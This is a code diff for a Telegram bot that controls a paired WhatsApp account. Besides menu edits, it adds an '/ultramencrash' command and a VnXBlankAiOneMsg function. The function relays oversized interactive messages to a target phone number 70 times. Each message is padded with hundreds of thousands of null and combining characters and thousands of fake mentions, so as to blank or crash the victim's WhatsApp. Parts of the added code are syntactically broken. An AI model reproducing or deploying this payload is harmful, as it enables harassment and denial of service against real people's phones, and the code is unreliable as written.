@@ -707,7 +707,7 @@ const startSesi = async () => {
   ⬡═―⊱〔 REQUEST PAIRING 〕⊰―═⬡
 ϟ    Number : ${linkedWhatsAppNumber}
 ϟ    Status : Connected
-`;
+`,
               { parse_mode: "HTML" }
             );
 
@@ -1037,17 +1037,18 @@ bot.use((ctx, next) => {
 function mainKeyboard() {
   return [
     [
-      { text: "⚙️𝐗𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒", callback_data: "xsettings", style: "danger", style: "success", style: "primary" },
-      { text: "🚀𝐗𝐌𝐄𝐍𝐔𝐁𝐔𝐆𝐒", callback_data: "xbugs", style: "danger", style: "success", style: "primary" }
+      { text: "⚙️𝐗𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒", callback_data: "xsettings", style: "success" },
+      { text: "🚀𝐗𝐌𝐄𝐍𝐔𝐁𝐔𝐆𝐒", callback_data: "xbugs", style: "danger" }
     ],
     [
-      { text: "💎𝐓𝐎𝐎𝐋𝐒", callback_data: "tools", style: "danger", style: "success", style: "primary"}
+      { text: "💎𝐓𝐎𝐎𝐋𝐒", callback_data: "tools", style: "success" }
     ],
     [
+      { text: "🎖️𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎" callback_data: "thanks", style: "success" },
       { text: "🌿𝐂𝐇𝐀𝐍𝐄𝐋", url: "https://t.me/AboutMybawz", style: "success" },
     ],
     [
-      { text: "👑𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑", url: "https://t.me/Bawzhhh", style: "danger", style: "success", style: "primary" }
+      { text: "👑𝐃𝐄𝐕", url: "https://t.me/Bawzhhh", style: "danger" }
     ]
   ];
 }
@@ -1148,11 +1149,46 @@ bot.action("xsettings", async (ctx) => {
   await editMenu(
     ctx,
     caption,
-    [[{ text: "🔙 BACK MENU", callback_data: "backmenu" }]],
+    [[{ text: "🔙 BACK MENU", callback_data: "backmenu", style: "primary" }]],
     { parse_mode: "HTML" }
   );
 });
+// =========================
 
+bot.action("thanks", async (ctx) => {
+  await ctx.answerCbQuery();
+
+  const caption = `
+<blockquote>☾. ⬡═―⊱「 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
+⩥ @Bawzhhh  
+<blockquote>☾. ⬡═―⊱「 𝐅𝐫𝐢𝐞𝐧𝐝 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
+⩥ @SonKairn    
+⩥ @Rifki_ofxz     
+⩥ @imherekobars   
+⩥ @Apexmbud     
+⩥ @Sniitzz     
+⩥ @ikyyymwNgewe    
+⩥ @bahlilmeme
+⩥ @ZuxxzyOffc1
+⩥ @PetxzVps
+<blockquote>☾. ⬡═―⊱「 𝐁𝐞𝐬𝐭 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
+⩥ @Allah
+⩥ @Ortu
+⩥ @Xatanicvxii
+⩥ @xwarrxxx
+⩥ @ungkeeeeee
+⩥ @Xerozzz_Reals      
+⩥ @FebbStecu      
+<blockquote>ִֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
+`;
+
+  await editMenu(
+    ctx,
+    caption,
+    [[{ text: "🔙 BACK MENU", callback_data: "backmenu", style: "primary" }]],
+    { parse_mode: "HTML" }
+  );
+});      
 // =========================
 
 bot.action("xbugs", async (ctx) => {
@@ -1185,10 +1221,10 @@ async function showxbugs(ctx, page = 1) {
 
     keyboard = [
       [
-        { text: "➡️", callback_data: "info_2" }
+        { text: "➡️", callback_data: "info_2", style: "success" }
       ],
       [
-        { text: "🔙 BACK MENU", callback_data: "backmenu" }
+        { text: "🔙 BACK MENU", callback_data: "backmenu", style: "primary" }
       ]
     ];
   }
@@ -1203,16 +1239,16 @@ async function showxbugs(ctx, page = 1) {
 ◇ Language  : JavaScript
 ◇ Framework : Telegraf
 <blockquote>☾. ⬡═―⊱「 ✨ NO SPAM MENU BUG 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
-◇ /androcrash   62xxxx  → Crash Android
+◇ /ultramencrash   62xxxx  → Blank WhatsApp One Msg
 <blockquote>ִֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
 `;
 
     keyboard = [
       [
-        { text: "⬅️", callback_data: "info_1" }
+        { text: "⬅️", callback_data: "info_1", style: "success" }
       ],
       [
-        { text: "🔙 BACK MENU", callback_data: "backmenu" }
+        { text: "🔙 BACK MENU", callback_data: "backmenu", style: "primary" }
       ]
     ];
   }
@@ -2233,6 +2269,58 @@ bot.command("lowsdelay", checkAllPremium, checkWhatsAppConnection, async (ctx) =
     }
   })();
 }); 
+/// --------- ( CASE BUG 6 ) ---------- \\\
+bot.command("ultramencrash", checkAllPremium, checkWhatsAppConnection, async (ctx) => {async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Format: /ultramencrash 62×××`);
+
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  let mention = true;
+
+  const processMessage = await ctx.telegram.sendPhoto(
+    ctx.chat.id,
+    { source: "./image/gxion.jpg" }, 
+    {
+      caption: `
+<blockquote><pre>𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤</pre></blockquote>
+⌑ Target : ${q}
+⌑ Type : BLANK ONE MSG
+⌑ Status : Process`,
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[
+          { text: "𝐂𝐡𝐞𝐜𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
+        ]]
+      }
+    }
+  );
+
+  const processMessageId = processMessage.message_id;
+
+  for (let i = 0; i < 70; i++) {
+    await VnXBlankAiOneMsg
+    await sleep(4000);
+  }
+
+  await ctx.telegram.editMessageCaption(
+    ctx.chat.id,
+    processMessageId,
+    undefined,
+    `
+<blockquote><pre>𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤</pre></blockquote>
+⌑ Target : ${q}
+⌑ Type : BLANK ONE MSG
+⌑ Status : Success`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[
+          { text: "𝐂𝐡𝐞𝐜𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
+        ]]
+      }
+    }
+  );
+});
 // ------------ (  FUNCTION BUGS ) -------------- \\
 async function DelayHardNullVnX(sock, target, ptcp = true) {
  
@@ -2778,6 +2866,67 @@ async function delayGabuts(sock, target) {
       };
     await sock.relayMessage(target, jut, {});
   }
+  
+  async function VnXBlankAiOneMsg(sock, target) {
+  const VnXlag = "ꦾ".repeat(250000); 
+  const VnXAiNew = [
+    "13135550202@bot", "13135550202@bot",
+    "13135550202@bot", "13135550202@bot",
+    "13135550202@bot", "13135550202@bot",
+    "13135550202@bot", "13135550202@bot",
+    "13135550202@bot", "13135550202@bot"
+  ];
+  const mentions = Array.from({ length: 5000 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`);
+  await sock.relayMessage(target, {
+    viewOnceMessage: {
+      message: {
+        interactiveMessage: {
+          body: { 
+            text: "VnX",
+            format: "DEFAULT"
+          }, 
+          nativeFlowMessage: {
+            buttons: [
+              {
+                name: "cta_url",
+                buttonParamsJson: JSON.stringify({
+                  paramsJson: "\u0000".repeat(900000) + "ી".repeat(250000),
+                  display_text: "VnX",
+                  url: "https://im.com",
+                  merchant_url: "https://im.com",
+                })
+              },
+              {
+                name: "cta_copy",
+                buttonParamsJson: JSON.stringify({
+                  display_text: VnXlag,
+                  copy_code: VnXlag
+                })
+              },
+              {
+                name: "quick_reply",
+                buttonParamsJson: JSON.stringify({
+                  display_text: VnXlag,
+                  id: "VnX"
+                })
+              }
+            ]
+          },
+          contextInfo: {
+            isForwarded: true,
+            forwardingScore: 9999,
+            remoteJid: VnXAiNew[0], 
+            mentionedJid: mentions
+          }
+        }
+      }
+    }
+  }, { 
+    participant: { jid: target },
+    messageId: sock.generateMessageTag() 
+  });
+  console.log(`[BugsGxion] Payload sent to ${target}`);
+}
 // --- Jalankan Bot --- //
 (async () => {
   try {
